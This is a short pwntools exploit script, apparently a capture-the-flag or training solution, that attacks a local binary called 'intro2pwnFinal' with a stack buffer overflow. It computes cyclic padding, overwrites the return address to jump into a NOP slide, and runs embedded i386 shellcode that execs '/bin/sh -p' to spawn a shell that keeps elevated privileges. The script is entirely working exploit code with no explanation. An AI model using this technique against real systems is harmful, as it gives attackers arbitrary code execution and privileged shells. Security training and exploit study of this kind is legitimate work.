from pwn import *

padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd500 + 200)

nop_slide = '\x90' * 1000

# Got the shellcode using command: shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f s
brkpnt = 'jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'

payload = padding + eip + nop_slide + brkpnt

proc = process('./intro2pwnFinal')
proc.recvline()
proc.send(payload)
proc.interactive()